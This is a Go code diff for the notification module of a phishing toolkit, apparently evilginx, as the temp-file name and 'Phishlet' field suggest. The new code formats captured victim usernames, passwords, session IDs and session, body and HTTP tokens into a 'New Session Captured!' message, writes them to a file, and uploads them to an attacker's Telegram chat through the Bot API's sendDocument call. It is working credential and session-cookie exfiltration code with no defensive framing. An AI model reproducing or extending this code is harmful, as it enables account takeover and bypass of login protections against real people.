@@ -1,9 +1,14 @@
 package core
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
+	"io"
+	"log"
 	"math/rand"
+	"mime/multipart"
+	"net/http"
 	"os"
 	"path/filepath"
 	"sync"
@@ -173,79 +178,191 @@ func createTxtFile(session TSession) (string, error) {
 
 func formatSessionMessage(session TSession) string {
 	// Format the session information (no token data in message)
-	return fmt.Sprintf("✨ Session Information ✨\n\n"+
 
-		"👤 Username:      ➖ %s\n"+
-		"🔑 Password:      ➖ %s\n"+
-		"🌐 Landing URL:   ➖ %s\n \n"+
-		"🖥️ User Agent:    ➖ %s\n"+
-		"🌍 Remote Address:➖ %s\n"+
-		"🕒 Create Time:   ➖ %d\n"+
-		"🕔 Update Time:   ➖ %d\n"+
-		"\n"+
-		"📦 Tokens are added in txt file and attached separately in message.\n",
+	// Format body tokens
+	var bodyTokensStr string
+	if len(session.BodyTokens) > 0 {
+		bodyTokensStr = "Body Tokens:\n"
+		for name, value := range session.BodyTokens {
+			bodyTokensStr += fmt.Sprintf("- %s: %v\n", name, value)
+		}
+	} else {
+		bodyTokensStr = "No body tokens captured\n"
+	}
 
-		session.Username,
-		session.Password,
-		session.LandingURL,
-		session.UserAgent,
-		session.RemoteAddr,
-		session.CreateTime,
-		session.UpdateTime,
+	// Format session tokens
+	var tokensStr string
+	if len(session.Tokens) > 0 {
+		tokensStr = "Session Tokens:\n"
+		for name, value := range session.Tokens {
+			tokensStr += fmt.Sprintf("- %s: %v\n", name, value)
+		}
+	} else {
+		tokensStr = "No session tokens captured\n"
+	}
+
+	// Format HTTP tokens
+	var httpTokensStr string
+	if len(session.HTTPTokens) > 0 {
+		httpTokensStr = "HTTP Tokens:\n"
+		for name, value := range session.HTTPTokens {
+			httpTokensStr += fmt.Sprintf("- %s: %v\n", name, value)
+		}
+	} else {
+		httpTokensStr = "No HTTP tokens captured\n"
+	}
+
+	// Format custom data
+	var customStr string
+	if len(session.Custom) > 0 {
+		customStr = "Custom Data:\n"
+		for key, value := range session.Custom {
+			customStr += fmt.Sprintf("- %s: %v\n", key, value)
+		}
+	} else {
+		customStr = "No custom data captured\n"
+	}
+
+	return fmt.Sprintf(`*New Session Captured!*
+Phishlet: %s
+Landing URL: %s
+Username: %s
+Password: %s
+Session ID: %s
+User Agent: %s
+Remote Address: %s
+Created: %d
+Updated: %d
+
+%s
+
+%s
+
+%s
+
+%s`,
+			session.Phishlet,
+			session.LandingURL,
+			session.Username,
+			session.Password,
+			session.SessionID,
+			session.UserAgent,
+			session.RemoteAddr,
+			session.CreateTime,
+			session.UpdateTime,
+			customStr,
+			tokensStr,
+			bodyTokensStr,
+			httpTokensStr,
 	)
 }
+
 func Notify(session TSession, chatid string, teletoken string) {
-
 	mu.Lock()
-	// Check if the session is already processed
-	if processedSessions[string(session.ID)] {
-		mu.Unlock()
-		messageID, exists := sessionMessageMap[string(session.ID)]
-		if exists {
-			txtFilePath, err := createTxtFile(session)
-			if err != nil {
-				fmt.Println("Error creating TXT file for update:", err)
-				return
-			}
-			msg_body := formatSessionMessage(session)
-			err = editMessageFile(chatid, teletoken, messageID, txtFilePath, msg_body)
-			if err != nil {
-				fmt.Printf("Error editing message: %v\n", err)
-			}
-			os.Remove(txtFilePath)
-		} else {
-			fmt.Println("Message ID not found for session:", session.ID)
-		}
+	defer mu.Unlock()
+
+	if processedSessions[session.SessionID] {
 		return
 	}
 
-	// Mark session as processed
-	processedSessions[string(session.ID)] = true
-	mu.Unlock()
+	processedSessions[session.SessionID] = true
 
-	// Create the TXT file for the original message
-	txtFilePath, err := createTxtFile(session)
-	if err != nil {
-		fmt.Println("Error creating TXT file:", err)
-		return
-	}
-
-	// Format the message
+	// Create a formatted message
 	message := formatSessionMessage(session)
 
-	// Send the notification and get the message ID
-	messageID, err := sendTelegramNotification(chatid, teletoken, message, txtFilePath)
+	// Create a temporary file for cookies
+	tempFile, err := os.CreateTemp(os.TempDir(), "evilginx_session_*.txt")
 	if err != nil {
-		fmt.Printf("Error sending Telegram notification: %v\n", err)
-		os.Remove(txtFilePath)
+		log.Printf("failed to create temporary file: %v", err)
+		return
+	}
+	defer os.Remove(tempFile.Name())
+
+	// Write session data to file
+	if _, err := tempFile.WriteString(message); err != nil {
+		log.Printf("failed to write session data to file: %v", err)
+		return
+	}
+	if err := tempFile.Close(); err != nil {
+		log.Printf("failed to close temporary file: %v", err)
 		return
 	}
 
-	// Map the session ID to the message ID
-	mu.Lock()
-	sessionMessageMap[string(session.ID)] = messageID
-	mu.Unlock()
+	// Create multipart form
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
 
-	// Remove the temporary TXT file
-	os.Remove(txtFilePath)
+	// Add text message
+	messagePart, err := writer.CreateFormField("text")
+	if err != nil {
+		log.Printf("error creating message part: %v", err)
+		return
+	}
+	if _, err := messagePart.Write([]byte(message)); err != nil {
+		log.Printf("error writing message: %v", err)
+		return
+	}
+
+	// Add parse mode
+	parseModePart, err := writer.CreateFormField("parse_mode")
+	if err != nil {
+		log.Printf("error creating parse_mode part: %v", err)
+		return
+	}
+	if _, err := parseModePart.Write([]byte("Markdown")); err != nil {
+		log.Printf("error writing parse_mode: %v", err)
+		return
+	}
+
+	// Add chat ID
+	chatIdPart, err := writer.CreateFormField("chat_id")
+	if err != nil {
+		log.Printf("error creating chat_id part: %v", err)
+		return
+	}
+	if _, err := chatIdPart.Write([]byte(chatid)); err != nil {
+		log.Printf("error writing chat_id: %v", err)
+		return
+	}
+
+	// Add session file
+	filePart, err := writer.CreateFormFile("document", filepath.Base(tempFile.Name()))
+	if err != nil {
+		log.Printf("error creating file part: %v", err)
+		return
+	}
+	if file, err := os.Open(tempFile.Name()); err != nil {
+		log.Printf("error opening file: %v", err)
+		return
+	} else {
+		if _, err := io.Copy(filePart, file); err != nil {
+			file.Close()
+			log.Printf("error copying file: %v", err)
+			return
+		}
+		file.Close()
+	}
+
+	writer.Close()
+
+	// Create request
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", teletoken)
+	req, err := http.NewRequest("POST", apiURL, body)
+	if err != nil {
+		log.Printf("error creating request: %v", err)
+		return
+	}
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Printf("error sending message: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		log.Printf("failed to send message: %s", resp.Status)
+	}
 }
